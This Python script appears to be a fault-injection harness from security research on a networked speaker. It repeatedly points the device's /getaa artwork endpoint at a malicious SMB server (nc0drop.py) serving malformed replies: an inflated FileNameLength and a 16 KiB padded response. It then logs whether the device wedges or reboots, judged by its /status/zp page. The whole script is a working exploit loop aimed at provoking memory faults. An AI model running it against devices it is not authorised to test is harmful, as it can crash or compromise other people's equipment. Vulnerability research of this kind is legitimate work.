#!/usr/bin/env python3
"""Pin-cycle aging ladder (bead frankensonos-f4k).

Each cycle on .86:
  1. PIN    : nc0drop --fndelta 60000 (FileNameLength declared 120014 => the known
              30s pin; the walk allocates ~120KB in the art worker).
  2. recover: poll /status/zp until 200 (max 90 s).
  3. WALK   : nc0drop --pad 16384 (16KiB reply + 2-byte margin) — the round-7/8
              fault shape whose wedge was heap-age dependent.
  4. recover + SWGen check via /status/zp.
Records per-cycle: pin verdict, walk verdict, SWGen before/after.
"""
import json, os, subprocess, sys, time, urllib.request

TGT = '192.168.4.86'
HOST = '192.168.4.46'
PY = '/private/tmp/fsonos-venv/bin/python'
ENV = dict(os.environ, PYTHONPATH='/tmp/impacket-fresh')
NC0 = '/Users/jemanuel/projects/frankensonos/recon/smb4149/nc0drop.py'
LOGDIR = '/tmp/f4k_ladder'
os.makedirs(LOGDIR, exist_ok=True)
CYCLES = int(sys.argv[1]) if len(sys.argv) > 1 else 12
BASE_PORT = 4400

def zp():
    p = subprocess.run(['curl', '-s', '-m', '4', f'http://{TGT}:1400/status/zp'],
                       capture_output=True, text=True)
    return (200, p.stdout) if p.returncode == 0 and p.stdout else (0, '')

def swgen():
    c, t = zp()
    if c != 200: return None
    i = t.find('<SWGen>')
    return t[i+7:t.find('<', i+7)] if i >= 0 else None

def curl_getaa(port, timeout=45, name='folder.jpg'):
    url = f'http://{TGT}:1400/getaa?u=x-file-cifs%3A%2F%2F{HOST}%3A{port}%2FS%2F{name}&w=200&h=200'
    p = subprocess.run(['curl', '-s', '-m', str(timeout), '-o', '/dev/null',
                        '-w', '%{http_code}:%{time_total}', url],
                       capture_output=True, text=True)
    return p.stdout.strip() if p.returncode == 0 else 'curlrc%d' % p.returncode

def serve(args, port, logname):
    log = open(os.path.join(LOGDIR, logname), 'w')
    p = subprocess.Popen([PY, NC0, str(port)] + args, stdout=log, stderr=subprocess.STDOUT, env=ENV)
    time.sleep(2.0)
    return p, log

def stop(p, log):
    p.terminate()
    try: p.wait(timeout=5)
    except Exception: p.kill()
    log.close()

def wait_alive(max_s=90):
    t0 = time.time()
    while time.time() - t0 < max_s:
        c, _ = zp()
        if c == 200: return time.time() - t0
        time.sleep(1.0)
    return None

results = []
pre_sw = swgen()
print(f'start SWGen={pre_sw}', flush=True)
for cyc in range(1, CYCLES+1):
    rec = {'cycle': cyc, 'sw_before': swgen()}
    # PIN
    p, log = serve(['--fndelta', '60000'], BASE_PORT + (cyc % 5), f'pin_{cyc}.log')
    nm = 'fa%d.jpg' % cyc
    rec['pin_getaa'] = curl_getaa(BASE_PORT + (cyc % 5), timeout=45, name=nm)
    stop(p, log)
    rec['pin_recover_s'] = wait_alive()
    # WALK
    p, log = serve(['--pad', '16384'], BASE_PORT + 5 + (cyc % 5), f'walk_{cyc}.log')
    rec['walk_getaa'] = curl_getaa(BASE_PORT + 5 + (cyc % 5), timeout=45, name=nm)
    stop(p, log)
    rec['walk_recover_s'] = wait_alive()
    rec['sw_after'] = swgen()
    wedge = rec['walk_recover_s'] is None or (rec['sw_after'] not in (None, rec['sw_before']))
    rec['verdict'] = 'WEDGE' if wedge else 'ok'
    results.append(rec)
    print(json.dumps(rec), flush=True)
    with open(os.path.join(LOGDIR, 'ladder.json'), 'w') as f:
        json.dump(results, f, indent=1)
print('final SWGen=', swgen(), flush=True)
